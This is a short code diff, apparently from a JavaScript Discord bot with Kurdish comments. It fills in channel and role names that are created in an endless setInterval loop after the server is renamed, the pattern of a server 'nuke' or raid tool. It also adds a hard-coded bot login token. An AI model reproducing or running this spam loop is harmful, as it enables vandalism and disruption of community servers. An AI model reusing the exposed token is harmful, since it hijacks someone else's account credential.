@@ -17,12 +17,12 @@ client.on("message", message => {
       });
       message.guild.setName("");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("", "voice");///////bo channel 
-        message.guild.createChannel("", "text");////bo voice
-        message.guild.createRole({ name: "" });////nawek dane bo role kan
+        message.guild.createChannel("SHVAN UP", "voice");///////bo channel 
+        message.guild.createChannel("SHVAN UP", "text");////bo voice
+        message.guild.createRole({ name: "PROGRESSHOME" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("");
+client.login("ODMzNzIwMzY0MTU2NzE1MDQx.YH2cmA.wD7xh2eBe792Xq16-At9aFrVEeI");
